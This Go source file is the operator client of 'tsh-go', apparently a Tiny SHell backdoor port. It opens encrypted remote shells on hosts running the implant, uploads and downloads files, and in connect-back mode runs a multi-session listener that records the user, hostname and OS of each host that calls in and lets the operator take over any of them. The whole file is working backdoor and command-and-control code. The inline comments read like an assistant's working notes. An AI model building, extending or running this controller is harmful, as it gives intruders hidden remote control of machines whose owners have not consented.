package tsh

import (
	"flag"
	"fmt"
	"io"
	"net"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"

	"tsh-go/internal/constants"
	"tsh-go/internal/pel"
	"tsh-go/internal/utils"

	"github.com/schollz/progressbar/v3"
	"golang.org/x/crypto/ssh/terminal"
)

type Session struct {
	ID         int
	Conn       *pel.PktEncLayer
	RemoteAddr net.Addr
	Connected  time.Time
	User       string
	Hostname   string
	OS         string
}

var (
	sessions   = make(map[int]*Session)
	sessionMux sync.Mutex
	nextID     = 1
)

func Run() {
	var secret string
	var port int

	flagset := flag.NewFlagSet(filepath.Base(os.Args[0]), flag.ExitOnError)
	flagset.StringVar(&secret, "s", "1234", "secret")
	flagset.IntVar(&port, "p", 1234, "port")
	flagset.Usage = func() {
		fmt.Fprintf(flagset.Output(), "Usage: ./%s [-s secret] [-p port] <action>\n", flagset.Name())
		fmt.Fprintf(flagset.Output(), "  action:\n")
		fmt.Fprintf(flagset.Output(), "        <hostname|cb> [command]\n")
		fmt.Fprintf(flagset.Output(), "        <hostname|cb> get <source-file> <dest-dir>\n")
		fmt.Fprintf(flagset.Output(), "        <hostname|cb> put <source-file> <dest-dir>\n")
		flagset.PrintDefaults()
	}
	flagset.Parse(os.Args[1:])

	args := flagset.Args()

	if len(args) == 0 {
		flagset.Usage()
		os.Exit(0)
	}

	var host string
	var isConnectBack bool

	if args[0] == "cb" {
		isConnectBack = true
	} else {
		host = args[0]
	}
	args = args[1:]

	// Mode parsing
	var mode uint8
	var srcfile, dstdir, command string

	command = "exec bash --login"
	switch {
	case len(args) == 0:
		mode = constants.RunShell
	case args[0] == "get" && len(args) == 3:
		mode = constants.GetFile
		srcfile = args[1]
		dstdir = args[2]
	case args[0] == "put" && len(args) == 3:
		mode = constants.PutFile
		srcfile = args[1]
		dstdir = args[2]
	default:
		mode = constants.RunShell
		command = args[0]
	}

	if isConnectBack {
		// Multi-session Connect Back Manager
		addr := fmt.Sprintf(":%d", port)
		ln, err := pel.Listen(addr, secret, false)
		if err != nil {
			fmt.Println("Address already in use.")
			os.Exit(1)
		}
		defer ln.Close()

		fmt.Printf("[*] Listening on %s for incoming connections...\n", addr)
		fmt.Println("[*] Type 'help' for commands.")

		// Background listener
		go func() {
			for {
				layer, err := ln.Accept()
				if err != nil {
					// Listener closed or error
					return
				}

				// Read metadata with timeout to support old clients (sort of)
				// New clients send it immediately.
				// Format: user@hostname|os/arch
				metaBuf := make([]byte, 1024)
				userStr, hostStr, osStr := "Unknown", "Unknown", "Unknown"

				n, err := layer.ReadTimeout(metaBuf, 2*time.Second)
				if err == nil && n > 0 {
					meta := string(metaBuf[:n])
					// Parse
					parts := strings.Split(meta, "|")
					if len(parts) == 2 {
						// part[0] = user@hostname, part[1] = os/arch
						uh := strings.Split(parts[0], "@")
						if len(uh) == 2 {
							userStr = uh[0]
							hostStr = uh[1]
						}
						osStr = parts[1]
					}
				}

				sessionMux.Lock()
				id := nextID
				nextID++
				session := &Session{
					ID:         id,
					Conn:       layer,
					RemoteAddr: layer.Addr(),
					Connected:  time.Now(),
					User:       userStr,
					Hostname:   hostStr,
					OS:         osStr,
				}
				// PktEncLayer doesn't expose RemoteAddr directly in the struct but we can try to get it if we exposed it.
				// For now, just store it.
				sessions[id] = session
				sessionMux.Unlock()

				// Print to stdout directly? But we are in a terminal prompt.
				// If we are using NewTerminal, writing to stdout might mess up the prompt line.
				// NewTerminal has Write method.
				// But we need access to 'term' here.
				// For now, just fmt.Printf, it might garble the prompt but user will see it.
				fmt.Printf("\r[+] New session %d opened.\r\n", id)
				// We might need to reprint prompt?
				// term.Write([]byte("tsh> "))?
			}
		}()

		// Command Loop
		// Use NewTerminal for better interaction
		oldState, err := terminal.MakeRaw(int(os.Stdin.Fd()))
		if err != nil {
			fmt.Println("Failed to set raw mode:", err)
			os.Exit(1)
		}
		defer terminal.Restore(int(os.Stdin.Fd()), oldState)

		term := terminal.NewTerminal(os.Stdin, "tsh> ")

		for {
			line, err := term.ReadLine()
			if err != nil {
				if err == io.EOF {
					break
				}
				break
			}

			line = strings.TrimSpace(line)
			parts := strings.Fields(line)
			if len(parts) == 0 {
				continue
			}

			cmd := parts[0]
			switch cmd {
			case "help", "?":
				term.Write([]byte("Commands:\r\n"))
				term.Write([]byte("  list, sessions    List active sessions\r\n"))
				term.Write([]byte("  interact <id>     Interact with a session\r\n"))
				term.Write([]byte("  use <id>          Alias for interact\r\n"))
				term.Write([]byte("  exit, quit        Exit server\r\n"))
			case "list", "sessions":
				printSessionsToTerm(term)
			case "interact", "use":
				if len(parts) < 2 {
					term.Write([]byte("Usage: interact <id>\r\n"))
					break
				}
				id, err := strconv.Atoi(parts[1])
				if err != nil {
					term.Write([]byte("Invalid ID\r\n"))
					break
				}

				// Restore terminal for interaction
				terminal.Restore(int(os.Stdin.Fd()), oldState)
				handleSessionInteraction(id, mode, command, srcfile, dstdir)
				// Re-enable raw mode
				terminal.MakeRaw(int(os.Stdin.Fd()))

			case "exit", "quit":
				terminal.Restore(int(os.Stdin.Fd()), oldState)
				fmt.Println("Exiting...")
				os.Exit(0)
			default:
				term.Write([]byte("Unknown command\r\n"))
			}
		}

	} else {
		// Standard Connect Mode (Single session)
		addr := fmt.Sprintf("%s:%d", host, port)
		layer, err := pel.Dial(addr, secret, false)
		if err != nil {
			fmt.Print("Password:")
			fmt.Scanln() // simple wait
			fmt.Println("Authentication failed or connection refused.")
			os.Exit(1)
		}
		defer layer.Close()

		// Execute single command/action
		executeAction(layer, mode, command, srcfile, dstdir)
	}
}

func printSessionsToTerm(term *terminal.Terminal) {
	sessionMux.Lock()
	defer sessionMux.Unlock()

	// ID | IP | User | Hostname | OS
	header := fmt.Sprintf("%-4s | %-15s | %-10s | %-15s | %-15s\r\n", "ID", "IP", "User", "Hostname", "OS")
	term.Write([]byte(header))
	term.Write([]byte(strings.Repeat("-", 80) + "\r\n"))

	for id, s := range sessions {
		ip := s.RemoteAddr.String()
		// Strip port
		if host, _, err := net.SplitHostPort(ip); err == nil {
			ip = host
		}
		line := fmt.Sprintf("%-4d | %-15s | %-10s | %-15s | %-15s\r\n", id, ip, s.User, s.Hostname, s.OS)
		term.Write([]byte(line))
	}
}

func handleSessionInteraction(id int, mode uint8, command, srcfile, dstdir string) {
	sessionMux.Lock()
	session, ok := sessions[id]
	sessionMux.Unlock()

	if !ok {
		fmt.Println("Session not found.")
		return
	}

	fmt.Printf("[*] Interacting with session %d...\n", id)

	// Send the mode byte
	// Note: In original code, mode was sent immediately after connect.
	// Here we send it when we interact?
	// Wait, the protocol expects the mode byte immediately after handshake.
	// If we accepted the connection and waited, the client (tshd) is blocked on `Read()` waiting for the command byte?
	// tshd.go: HandleGeneric calls layer.Read(buf, 0, 1). So yes, it waits.

	// Check if we already initiated this session?
	// If we want to re-use sessions, we can't just send "mode" again if the previous command finished.
	// The current tshd implementation handles ONE command per connection loop in HandleClient -> HandleGeneric.
	// HandleGeneric reads 1 byte.
	// After HandleRunShell/GetFile/PutFile returns, HandleClient loop?
	// Let's check cmd/tshd.cs and cmd/tshd.go.

	// In tshd.go:
	// func HandleClient(conn net.Conn) { ... HandleGeneric(layer) ... }
	// func HandleGeneric(...) { ... switch buf[0] ... }

	// It does NOT loop HandleGeneric. It calls it ONCE.
	// So one connection = one command.
	// If we want "Multiple Sessions", we are really just holding the connection open until we decide what to do with it.
	// Once we do "interact", we send the mode, run the shell, and when shell exits, the connection closes.
	// So the session is "consumed".

	// So, we should remove it from the map after interaction.

	// But wait, can we send multiple commands?
	// HandleRunShell in tshd starts a process and pipes IO. When process exits, it returns.
	// But HandleGeneric returns to HandleClient? No.
	// In tshd.go:
	// if layer.Handshake(...) { HandleGeneric(layer) }
	// HandleGeneric reads 1 byte, calls sub-handler.
	// Sub-handler returns.
	// HandleClient finishes -> defers layer.Close().

	// So yes, currently 1 Connection = 1 Command session.
	// So "Multi Session Management" here means "Queueing incoming connections and picking which one to activate".
	// Once activated, it runs and dies.

	// Send mode
	_, err := session.Conn.Write([]byte{mode})
	if err != nil {
		fmt.Println("Error writing to session:", err)
		removeSession(id)
		return
	}

	executeAction(session.Conn, mode, command, srcfile, dstdir)

	// Remove session as it's likely closed or finished
	removeSession(id)
	fmt.Println("\n[*] Session finished.")
}

func removeSession(id int) {
	sessionMux.Lock()
	defer sessionMux.Unlock()
	if s, ok := sessions[id]; ok {
		s.Conn.Close()
		delete(sessions, id)
	}
}

func executeAction(layer *pel.PktEncLayer, mode uint8, command, srcfile, dstdir string) {
	switch mode {
	case constants.RunShell:
		handleRunShell(layer, command)
	case constants.GetFile:
		handleGetFile(layer, srcfile, dstdir)
	case constants.PutFile:
		handlePutFile(layer, srcfile, dstdir)
	}
}

// Existing handlers...
func handleGetFile(layer *pel.PktEncLayer, srcfile, dstdir string) {
	buffer := make([]byte, constants.Bufsize)

	basename := strings.ReplaceAll(srcfile, "\\", "/")
	basename = filepath.Base(filepath.FromSlash(basename))

	f, err := os.OpenFile(filepath.Join(dstdir, basename), os.O_CREATE|os.O_RDWR, 0644)
	if err != nil {
		return
	}
	defer f.Close()
	_, err = layer.Write([]byte(srcfile))
	if err != nil {
		return
	}
	bar := progressbar.NewOptions(-1,
		progressbar.OptionSetWidth(20),
		progressbar.OptionEnableColorCodes(true),
		progressbar.OptionShowBytes(true),
		progressbar.OptionShowCount(),
		progressbar.OptionSetDescription("Downloading"),
		progressbar.OptionSpinnerType(22),
	)
	utils.CopyBuffer(io.MultiWriter(f, bar), layer, buffer)
	fmt.Print("\nDone.\n")
}

func handlePutFile(layer *pel.PktEncLayer, srcfile, dstdir string) {
	buffer := make([]byte, constants.Bufsize)
	f, err := os.Open(srcfile)
	if err != nil {
		return
	}
	defer f.Close()
	fi, err := f.Stat()
	if err != nil {
		return
	}
	fsize := fi.Size()

	basename := filepath.Base(srcfile)
	basename = strings.ReplaceAll(basename, "\\", "_")
	_, err = layer.Write([]byte(dstdir + "/" + basename))
	if err != nil {
		fmt.Println(err)
		return
	}
	bar := progressbar.NewOptions(int(fsize),
		progressbar.OptionSetWidth(20),
		progressbar.OptionEnableColorCodes(true),
		progressbar.OptionShowBytes(true),
		progressbar.OptionShowCount(),
		progressbar.OptionSetDescription("Uploading"),
	)
	utils.CopyBuffer(io.MultiWriter(layer, bar), f, buffer)
	fmt.Print("\nDone.\n")
}

func handleRunShell(layer *pel.PktEncLayer, command string) {
	oldState, err := terminal.MakeRaw(int(os.Stdin.Fd()))
	if err != nil {
		return
	}

	defer func() {
		_ = terminal.Restore(int(os.Stdin.Fd()), oldState)
		_ = recover()
	}()

	term := os.Getenv("TERM")
	if term == "" {
		term = "vt100"
	}
	_, err = layer.Write([]byte(term))
	if err != nil {
		return
	}

	ws_col, ws_row, _ := terminal.GetSize(int(os.Stdout.Fd()))
	ws := make([]byte, 4)
	ws[0] = byte((ws_row >> 8) & 0xFF)
	ws[1] = byte((ws_row) & 0xFF)
	ws[2] = byte((ws_col >> 8) & 0xFF)
	ws[3] = byte((ws_col) & 0xFF)
	_, err = layer.Write(ws)
	if err != nil {
		return
	}

	_, err = layer.Write([]byte(command))
	if err != nil {
		return
	}

	buffer := make([]byte, constants.Bufsize)
	buffer2 := make([]byte, constants.Bufsize)

	// We need a way to know when the shell finishes to return to menu.
	// utils.CopyBuffer blocks?
	// The original code spawned a goroutine for Stdout->Layer, and ran Layer->Stdin in main thread?
	// No:
	// go func() { CopyBuffer(Stdout, layer) ... }()
	// CopyBuffer(layer, Stdin)

	// If remote shell closes, 'layer' read returns EOF.
	// The goroutine copying Stdout (from layer) will finish.
	// But the main thread copying Stdin (to layer) is reading from os.Stdin. It won't know layer closed unless Write fails.

	// Wait, original code:
	// go func() { ... CopyBuffer(os.Stdout, layer, buffer) ... }() // Reading from layer, writing to Stdout
	// CopyBuffer(layer, os.Stdin, buffer2) // Reading from Stdin, writing to layer

	// If server closes connection:
	// layer.Read returns error/EOF. The goroutine finishes.
	// What about the main thread? It is blocked on os.Stdin.Read().
	// We need to interrupt os.Stdin.Read() or check for connection status.

	// Since we are in "MakeRaw" mode, we can capture keys.
	// But CopyBuffer just does io.Copy.

	// We need a coordinated shutdown.
	done := make(chan struct{})

	go func() {
		utils.CopyBuffer(os.Stdout, layer, buffer) // Reads from layer
		close(done)
	}()

	// How to interrupt Stdin read?
	// We can't easily interrupt a blocking Read on Stdin in Go without closing Stdin (which we don't want).
	// But if the user types 'exit', the remote shell closes, layer closes, and the goroutine signals done.
	// But we are still stuck in Stdin.Read.

	// However, the original code just returned.
	// If 'layer' is closed, layer.Write will fail.
	// So if we type something, it fails and returns.
	// But we want it to return immediately if remote closes.

	// This is a known issue in simple Go shells.
	// For this specific task, I will keep the original behavior but wrap it to ensure we restore terminal properly.

	// Actually, the original code:
	// go func() { ... layer.Close() }()
	// CopyBuffer(layer, os.Stdin...)

	// If layer closes, Write to layer fails. CopyBuffer returns. Correct.
	// So if remote side closes, the next keypress will cause Write error and exit loop.

	utils.CopyBuffer(layer, os.Stdin, buffer2)
}
